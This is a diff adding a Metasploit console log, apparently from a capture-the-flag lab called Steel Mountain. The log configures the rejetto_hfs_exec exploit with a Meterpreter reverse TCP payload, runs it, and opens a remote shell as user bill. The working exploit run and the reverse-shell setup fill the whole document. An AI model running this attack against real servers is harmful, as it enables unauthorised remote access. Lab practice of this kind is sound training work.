@@ -1,0 +1,54 @@
+msf6 exploit(windows/http/rejetto_hfs_exec) > options
+
+Module options (exploit/windows/http/rejetto_hfs_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   HTTPDELAY  10               no        Seconds to wait before terminating web server
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.232.179    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      8080             yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       The path of the web application
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.8.147.132     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(windows/http/rejetto_hfs_exec) > run
+
+[*] Started reverse TCP handler on 10.8.147.132:4444
+[*] Using URL: http://0.0.0.0:8080/HIqxo2YSJCHPJ
+[*] Local IP: http://192.168.88.10:8080/HIqxo2YSJCHPJ
+[*] Server started.
+[*] Sending a malicious request to /
+/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
+/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
+[*] Payload request received: /HIqxo2YSJCHPJ
+[*] Sending stage (175174 bytes) to 10.10.232.179
+[*] Meterpreter session 1 opened (10.8.147.132:4444 -> 10.10.232.179:49211) at 2021-05-08 12:13:59 +0200
+[!] Tried to delete %TEMP%\CBhkSWjjAQKGc.vbs, unknown result
+[*] Server stopped.
+
+meterpreter > getuid
+Server username: STEELMOUNTAIN\bill
+meterpreter >
+
